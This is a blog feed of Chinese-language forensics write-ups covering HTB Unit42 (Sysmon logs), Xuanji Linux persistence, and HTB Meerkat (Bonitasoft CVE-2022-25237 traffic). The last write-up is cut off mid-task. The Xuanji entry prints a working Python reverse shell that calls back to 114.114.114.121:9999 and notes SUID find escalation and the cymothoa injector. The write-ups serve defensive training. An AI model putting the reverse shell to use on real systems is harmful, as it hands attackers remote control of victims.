    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Unit42</title>
    <link href="/2025/03/26/HTB-Unit42/"/>
    <url>/2025/03/26/HTB-Unit42/</url>
    
    <content type="html"><![CDATA[<p>Level ：Very Easy</p><span id="more"></span><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>In this Sherlock, you will familiarize yourself with Sysmon logs and various useful EventIDs for identifying and analyzing malicious activities on a Windows system. Palo Alto’s Unit42 recently conducted research on an UltraVNC campaign, wherein attackers utilized a backdoored version of UltraVNC to maintain access to systems. This lab is inspired by that campaign and guides participants through the initial access stage of the campaign.</p><h1 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h1><p>用 Windows 自带的时间查看器打开，筛选一下 ID 就知道了</p><p><img src="https://img.dkdun.cn/v1/2025/12/641ff42c61e7a890.png"></p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">How many <span class="hljs-keyword">Event</span> logs are there <span class="hljs-keyword">with</span> <span class="hljs-keyword">Event</span> ID <span class="hljs-number">11</span>?<br>:<span class="hljs-number">56</span><br></code></pre></td></tr></table></figure><h1 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h1><p>筛选事件 ID 为 1 的日志，一个一个查看详细信息，可以发现下载了 <code>Preventivo24.02.14.exe.exe</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/270fc11326e69cee.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Whenever a process <span class="hljs-keyword">is</span> created <span class="hljs-keyword">in</span> memory, an event <span class="hljs-keyword">with</span> Event ID <span class="hljs-number">1</span> <span class="hljs-keyword">is</span> recorded <span class="hljs-keyword">with</span> details such <span class="hljs-keyword">as</span> command <span class="hljs-type">line</span>, hashes, process <span class="hljs-type">path</span>, parent process <span class="hljs-type">path</span>, etc. This information <span class="hljs-keyword">is</span> very useful <span class="hljs-keyword">for</span> an analyst because it allows us <span class="hljs-keyword">to</span> see <span class="hljs-keyword">all</span> programs executed <span class="hljs-keyword">on</span> a <span class="hljs-keyword">system</span>, which means we can spot <span class="hljs-keyword">any</span> malicious processes being executed. What <span class="hljs-keyword">is</span> the malicious process that infected the victim<span class="hljs-string">&#x27;s system</span><br><span class="hljs-string">:C:\Users\CyberJunkie\Downloads\Preventivo24.02.14.exe.exe</span><br></code></pre></td></tr></table></figure><h1 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h1><p>筛选 DNS 事件，ID 为 22，可用于查找系统发出的任何 DNS 查询</p><p><img src="https://img.dkdun.cn/v1/2025/12/e4958e0776ec3034.png"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">Which Cloud drive was used <span class="hljs-selector-tag">to</span> distribute the malware?<br><span class="hljs-selector-pseudo">:drop</span>box<br></code></pre></td></tr></table></figure><h1 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h1><p>筛选 ID 为 2 的事件，此事件 ID 记录系统上任何文件的任何文件创建时间变化。</p><p><img src="https://img.dkdun.cn/v1/2025/12/6fa3f830749adb4f.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">For many <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">files</span> <span class="hljs-keyword">it</span> wrote <span class="hljs-built_in">to</span> disk, <span class="hljs-keyword">the</span> initial malicious <span class="hljs-built_in">file</span> used <span class="hljs-keyword">a</span> defense evasion technique called Time Stomping, where <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> creation <span class="hljs-built_in">date</span> is changed <span class="hljs-built_in">to</span> make <span class="hljs-keyword">it</span> appear older <span class="hljs-keyword">and</span> blend <span class="hljs-keyword">in</span> <span class="hljs-keyword">with</span> other <span class="hljs-built_in">files</span>. What was <span class="hljs-keyword">the</span> timestamp changed <span class="hljs-built_in">to</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> PDF <span class="hljs-built_in">file</span>?<br>:<span class="hljs-number">2024</span><span class="hljs-number">-01</span><span class="hljs-number">-14</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">06</span><br></code></pre></td></tr></table></figure><h1 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h1><p>筛选 ID 为 11 的事件</p><p><img src="https://img.dkdun.cn/v1/2025/12/51ac9f49d6ea327b.png"></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">The malicious file dropped a few files on disk. Where was &quot;once.cmd&quot; created on disk? Please answer with the full path along with the filename.<br><span class="hljs-meta">: C:\Users\CyberJunkie\AppData\Roaming\Photo</span> and Fax Vn\Photo and vn 1.1.2\install\F97891C\WindowsVolume\Games\once.cmd <br></code></pre></td></tr></table></figure><h1 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h1><p>筛选 DNS 事件，ID 为 22</p><p><img src="https://img.dkdun.cn/v1/2025/12/e4852961e571c92f.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">The malicious <span class="hljs-built_in">file</span> attempted <span class="hljs-built_in">to</span> reach <span class="hljs-keyword">a</span> dummy domain, most likely <span class="hljs-built_in">to</span> check <span class="hljs-keyword">the</span> <span class="hljs-keyword">internet</span> connection status. What domain name did <span class="hljs-keyword">it</span> <span class="hljs-keyword">try</span> <span class="hljs-built_in">to</span> connect <span class="hljs-built_in">to</span>?<br>:www.example.com<br></code></pre></td></tr></table></figure><h1 id="Task-7"><a href="#Task-7" class="headerlink" title="Task 7"></a>Task 7</h1><p><img src="https://img.dkdun.cn/v1/2025/12/1ed51d5e6606defb.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Which IP address did <span class="hljs-keyword">the</span> malicious <span class="hljs-built_in">process</span> <span class="hljs-keyword">try</span> <span class="hljs-built_in">to</span> reach out <span class="hljs-built_in">to</span>?<br>:<span class="hljs-number">93.184</span><span class="hljs-number">.216</span><span class="hljs-number">.34</span><br></code></pre></td></tr></table></figure><h1 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h1><p>一条一条看，然后看到有关于 <code>UVncVirtualDisplay</code> 的路径</p><p><img src="https://img.dkdun.cn/v1/2025/12/b0f504f6aeb99583.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">The malicious <span class="hljs-built_in">process</span> terminated itself <span class="hljs-keyword">after</span> infecting <span class="hljs-keyword">the</span> PC <span class="hljs-keyword">with</span> <span class="hljs-keyword">a</span> backdoored variant <span class="hljs-keyword">of</span> UltraVNC. When did <span class="hljs-keyword">the</span> <span class="hljs-built_in">process</span> terminate itself?<br>:<span class="hljs-number">2024</span><span class="hljs-number">-02</span><span class="hljs-number">-14</span> <span class="hljs-number">03</span>:<span class="hljs-number">41</span>:<span class="hljs-number">58</span><br></code></pre></td></tr></table></figure><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>Sysmon 生成的每种事件类型的示例</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">事件 <span class="hljs-title class_">ID</span> <span class="hljs-number">1</span><span class="hljs-symbol">:</span>有关新创建进程的扩展信息<br>事件 <span class="hljs-title class_">ID</span> <span class="hljs-number">2</span><span class="hljs-symbol">:</span>记录更改文件创建时间事件<br>事件 <span class="hljs-title class_">ID</span> <span class="hljs-number">3</span><span class="hljs-symbol">:</span>网络连接事件记录计算机上的 <span class="hljs-title class_">TCP</span>/<span class="hljs-title class_">UDP</span> 连接<br>事件 <span class="hljs-title class_">ID</span> <span class="hljs-number">11</span><span class="hljs-symbol">:</span>当创建或覆盖文件时，会记录文件创建操作<br>事件 <span class="hljs-title class_">ID</span> <span class="hljs-number">22</span><span class="hljs-symbol">:DNSEvent</span>（<span class="hljs-title class_">DNS</span> 查询）<br></code></pre></td></tr></table></figure><p>具体事件 ID 详解：<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon">Events</a></p>]]></content>
    
    
    <categories>
      
      <category>应急响应&amp;取证</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>玄机-第三章</title>
    <link href="/2025/03/25/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/"/>
    <url>/2025/03/25/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<p>linux 权限维持-隐藏</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ssh root@env.xj.edisec.net -p  密码  xjqxwcyc</span><br><span class="language-xml">1.黑客隐藏的隐藏的文件 完整路径md5</span><br><span class="language-xml">2.黑客隐藏的文件反弹shell的ip+端口 </span><span class="hljs-template-variable">&#123;ip:port&#125;</span><span class="language-xml"></span><br><span class="language-xml">3.黑客提权所用的命令 完整路径的md5 flag</span><span class="hljs-template-variable">&#123;md5&#125;</span><span class="language-xml"> </span><br><span class="language-xml">4.黑客尝试注入恶意代码的工具完整路径md5</span><br><span class="language-xml">5.使用命令运行 ./x.xx 执行该文件  将查询的 Exec****** 值 作为flag提交 flag</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">xxx</span>/xxx/xxx&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h1><p>使用命令查找文件，发现在 <code>/tmp</code> 下还有一个隐藏的 <code>.temp</code> 文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;.*&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/128843394083324c.png"></p><p>进入找到了 <code>1.py</code> 文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/b699994f9e1585c6.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">109</span>ccb5768c70638e24fb46ee7957e37&#125;<br></code></pre></td></tr></table></figure><h1 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h1><p>一个反弹 shell 的文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">import</span> socket,subprocess,os,sys, time<br><br>pidrg = os.fork()<br><span class="hljs-keyword">if</span> pidrg &gt; <span class="hljs-number">0</span>:<br>        sys.exit(<span class="hljs-number">0</span>)<br><br>os.chdir(<span class="hljs-string">&quot;/&quot;</span>)<br>os.setsid()<br>os.umask(<span class="hljs-number">0</span>)<br>drgpid = os.fork()<br><span class="hljs-keyword">if</span> drgpid &gt; <span class="hljs-number">0</span>:<br>        sys.exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">try</span>:<br>                sys.stdout.flush()<br>                sys.stderr.flush()<br>                fdreg = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>                sys.stdout = fdreg<br>                sys.stderr = fdreg<br>                sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>                sdregs.connect((<span class="hljs-string">&quot;114.114.114.121&quot;</span>,<span class="hljs-number">9999</span>))<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">0</span>)<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">1</span>)<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">2</span>)<br>                p=subprocess.call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])<br>                sdregs.close()<br>        <span class="hljs-keyword">except</span> Exception:<br>                <span class="hljs-keyword">pass</span><br>        time.sleep(<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>找到 IP 和端口：114.114.114.121:9999</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">114.114.114.121:9999</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h1><p>一般关于提权的可以先查找跟 <code>suid</code> 有关的东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@xuanji:~# find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>/bin/mount<br>/bin/ping<br>/bin/ping6<br>/bin/su<br>/bin/umount<br>/usr/bin/chfn<br>/usr/bin/chsh<br>/usr/bin/find<br>/usr/bin/gpasswd<br>/usr/bin/newgrp<br>/usr/bin/passwd<br>/usr/bin/sudo<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br></code></pre></td></tr></table></figure><p>可以发现过滤出来了一个 <code>find</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/a8f53deedf44cf0c.png"></p><p>find 也可以提权：<a href="https://gtfobins.github.io/gtfobins/find/">find</a>，所以路径为： <code>/usr/bin/find</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">7</span>fd5884f493f4aaf96abee286ee04120&#125;<br></code></pre></td></tr></table></figure><h1 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h1><p>查找隐藏的文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -<span class="hljs-built_in">type</span> d -name <span class="hljs-string">&quot;.*&quot;</span> -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/83c4c3b40a572248.png"></p><p>进入 <code>/opt/.cymothoa-1-beta</code>，发现了 <code>cymothoa</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/5d0a3afbf8b67511.png"></p><p><code>cymothoa</code> 是一款隐秘的后门工具。它通过向目标主机活跃的进程注入恶意代码，从而获取和原进程相同的权限，工具最大的优点就是不创建新的进程，不容易被发现，所以尝试注入恶意代码的工具完整路径为：<code>/opt/.cymothoa-1-beta/cymothoa</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">087</span>c267368ece4fcf422ff733b51aed9&#125;<br></code></pre></td></tr></table></figure><h1 id="Q5"><a href="#Q5" class="headerlink" title="Q5"></a>Q5</h1><h2 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h2><p>执行 <code>1.py</code> 文件，因为前面知道文件 <code>#!/usr/bin/python3</code>，用 python3 执行，根据 PID 查找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@xuanji:/# python3 /tmp/.temp/libprocesshider/1.py<br>root@xuanji:/# ps -ef | grep <span class="hljs-string">&quot;1.py&quot;</span><br>root         428       1  0 14:25 ?        00:00:00 python3 /tmp/.temp/libprocesshider/1.py<br>root         430     405  0 14:25 pts/0    00:00:00 grep --color=auto 1.py<br>root@xuanji:/# ll /proc/428/exe<br>lrwxrwxrwx. 1 root root 0 Mar 25 14:25 /proc/428/exe -&gt; /usr/bin/python3.4*<br></code></pre></td></tr></table></figure><p>所以 flag 为</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">usr</span>/bin/python3.4&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h2><p>还可以执行之查找 <code>python3</code> 的运行情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@xuanji:/# python3 /tmp/.temp/libprocesshider/1.py<br>root@xuanji:/# <span class="hljs-built_in">which</span> python3<br>/usr/bin/python3<br>root@xuanji:/# <span class="hljs-built_in">ls</span> -al /usr/bin/python3<br>lrwxrwxrwx. 1 root root 9 Mar 23  2014 /usr/bin/python3 -&gt; python3.4<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>应急响应&amp;取证</category>
      
      <category>玄机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Meerkat</title>
    <link href="/2025/03/25/HTB-Meerkat/"/>
    <url>/2025/03/25/HTB-Meerkat/</url>
    
    <content type="html"><![CDATA[<p>Level：Easy</p><span id="more"></span><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>As a fast-growing startup, Forela has been utilising a business management platform. Unfortunately, our documentation is scarce, and our administrators aren’t the most security aware. As our new security provider we’d like you to have a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised.</p><h1 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h1><p>对于流量包，我的习惯是从 http 协议的流量开始分析，所以先过滤 http 流量，而且 4 开头的状态码都没用</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http&amp;&amp;!http.response.code &gt; 400<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/2d3eff5a57f21a52.png"></p><p>可以看到有很多 POST 请求</p><p><img src="https://img.dkdun.cn/v1/2025/12/9eaa566db23c9844.png"></p><p>追踪 TCP 流发现应该是在进行登录，这大量的请求挺像在爆破的</p><p><img src="https://img.dkdun.cn/v1/2025/12/1de875aa12ca6e20.png"></p><p>谷歌搜索 <code>bonita</code> 发现了软件，“Get limitless extensibility with Bonita, the process automation platform that doesn’t lock you in”，一个流程自动化平台，所以答案为 <code>bonitasoft</code></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">We <span class="hljs-keyword">believe </span>our <span class="hljs-keyword">Business </span>Management Platform server has <span class="hljs-keyword">been </span>compromised. Please can you confirm the name of the application running?<br>:<span class="hljs-keyword">BonitaSoft</span><br></code></pre></td></tr></table></figure><h1 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h1><p>从数据中可以看出 <code>156.146.62.213</code> 一直在向 <code>172.31.6.44</code> 的 <code>/bonita/loginservice</code> 发送请求，追踪流会发现每个包的请求的 <code>username</code> 和 <code>password</code> 字段的值都不一样，确实应该是在爆破</p><p><img src="https://img.dkdun.cn/v1/2025/12/d15abedf4025b4c8.png"></p><p>看了一些数据之后会发现有一定的规律，用户名大多数以 <code>@forela.co.uk</code> 结尾，不仅如此还有 <code>install</code> 用户的请求信息</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">install</span>:<span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure><p><a href="https://documentation.bonitasoft.com/bonita/latest/identity/tenant-admin-credentials">Tenant administrator credentials</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/edf61a39ff651bde.png"></p><p><code>install</code>  是 Bonitasoft 的默认用户，可以猜一下可能是有泄露的一些账户，符合 <a href="https://attack.mitre.org/techniques/T1110/004/">Brute Force: Credential Stuffing</a> 条件，暴力破解的一种技术：凭证填充，也叫撞库攻击</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">We believe <span class="hljs-keyword">the</span> attacker may have used <span class="hljs-keyword">a</span> subset <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> brute forcing attack category - what is <span class="hljs-keyword">the</span> name <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> attack carried out?<br>:Credential Stuffing<br></code></pre></td></tr></table></figure><h1 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h1><p>用 <code>jq</code> 获取文件中不同警报签名 <code>alert.signature</code> 字段出现次数，然后按照次数从高到低排序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# <span class="hljs-built_in">cat</span> <span class="hljs-string">&#x27;/mnt/f/渗透/HackTheBox/meerkat/meerkat-alerts.json&#x27;</span> | jq <span class="hljs-string">&#x27;.[].alert.signature&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr<br>    134 <span class="hljs-string">&quot;ET INFO User-Agent (python-requests) Inbound to Webserver&quot;</span><br>     59 <span class="hljs-string">&quot;ET WEB_SPECIFIC_APPS Bonitasoft Default User Login Attempt M1 (Possible Staging for CVE-2022-25237)&quot;</span><br>     17 <span class="hljs-string">&quot;ET DROP Dshield Block Listed Source group 1&quot;</span><br>     12 <span class="hljs-string">&quot;ET EXPLOIT Bonitasoft Authorization Bypass M1 (CVE-2022-25237)&quot;</span><br>      6 <span class="hljs-string">&quot;ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management&quot;</span><br>      4 <span class="hljs-string">&quot;GPL WEB_SERVER DELETE attempt&quot;</span><br>      4 <span class="hljs-string">&quot;ET EXPLOIT Bonitasoft Successful Default User Login Attempt (Possible Staging for CVE-2022-25237)&quot;</span><br>      4 <span class="hljs-string">&quot;ET EXPLOIT Bonitasoft Authorization Bypass and RCE Upload M1 (CVE-2022-25237)&quot;</span><br>      3 <span class="hljs-string">&quot;ET CINS Active Threat Intelligence Poor Reputation IP group 84&quot;</span><br>      3 <span class="hljs-string">&quot;ET CINS Active Threat Intelligence Poor Reputation IP group 82&quot;</span><br>      2 null<br>      1 <span class="hljs-string">&quot;GPL SNMP public access udp&quot;</span><br>      1 <span class="hljs-string">&quot;ET SCAN Suspicious inbound to PostgreSQL port 5432&quot;</span><br>      1 <span class="hljs-string">&quot;ET SCAN Suspicious inbound to Oracle SQL port 1521&quot;</span><br>      1 <span class="hljs-string">&quot;ET SCAN Suspicious inbound to mySQL port 3306&quot;</span><br>      1 <span class="hljs-string">&quot;ET SCAN Suspicious inbound to MSSQL port 1433&quot;</span><br>      1 <span class="hljs-string">&quot;ET SCAN Potential VNC Scan 5900-5920&quot;</span><br>      1 <span class="hljs-string">&quot;ET SCAN Potential VNC Scan 5800-5820&quot;</span><br>      1 <span class="hljs-string">&quot;ET CINS Active Threat Intelligence Poor Reputation IP group 81&quot;</span><br>      1 <span class="hljs-string">&quot;ET CINS Active Threat Intelligence Poor Reputation IP group 76&quot;</span><br>      1 <span class="hljs-string">&quot;ET CINS Active Threat Intelligence Poor Reputation IP group 31&quot;</span><br>      1 <span class="hljs-string">&quot;ET CINS Active Threat Intelligence Poor Reputation IP group 29&quot;</span><br>      1 <span class="hljs-string">&quot;ET CINS Active Threat Intelligence Poor Reputation IP group 13&quot;</span><br>      1 <span class="hljs-string">&quot;ET ATTACK_RESPONSE Possible /etc/passwd via HTTP (linux style)&quot;</span><br>      1 <span class="hljs-string">&quot;ET 3CORESec Poor Reputation IP group 42&quot;</span><br>      1 <span class="hljs-string">&quot;ET 3CORESec Poor Reputation IP group 18&quot;</span><br></code></pre></td></tr></table></figure><p>可以发现频繁出现了 <code>CVE-2022-25237</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">jq <span class="hljs-string">&#x27;.[].alert.signature&#x27;</span> <span class="hljs-string">&#x27;/mnt/f/渗透/HackTheBox/meerkat/meerkat-alerts.json&#x27;</span> | grep CVE<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ee5943192138b836.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Does <span class="hljs-keyword">the</span> vulnerability exploited have <span class="hljs-keyword">a</span> CVE assigned - <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span> so, which <span class="hljs-literal">one</span>?<br>:CVE<span class="hljs-number">-2022</span><span class="hljs-number">-25237</span><br></code></pre></td></tr></table></figure><h1 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h1><p>“i18ntranslation or &#x2F;..&#x2F;i18ntranslation&#x2F; to the end of a URL” </p><p><img src="https://img.dkdun.cn/v1/2025/12/0d2bbbd0045f432d.png"></p><p>同样，我们在流量包里过滤一下也能发现</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http &amp;&amp; !http.response.code &gt; 400 &amp;&amp; http.request.uri matches &quot;API&quot;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/2594437ac78f5ae0.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Which string was appended <span class="hljs-keyword">to</span> the API URL <span class="hljs-type">path</span> <span class="hljs-keyword">to</span> bypass the <span class="hljs-keyword">authorization</span> <span class="hljs-keyword">filter</span> <span class="hljs-keyword">by</span> the attacker<span class="hljs-string">&#x27;s exploit?</span><br><span class="hljs-string">:i18ntranslation</span><br></code></pre></td></tr></table></figure><h1 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h1><p>首先过滤出带有 POST 请求 <code>/bonita/loginservice</code> 的数据，118 条</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http.request.method ==&quot;POST&quot; &amp;&amp; http.request.uri contains &quot;/bonita/loginservice&quot;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/24ef4bf790f7f03b.png"></p><p>把带有 <code>install</code> 用户的数据包过滤了</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http.request.method ==&quot;POST&quot; &amp;&amp; http.request.uri contains &quot;/bonita/loginservice&quot; &amp;&amp; !http contains 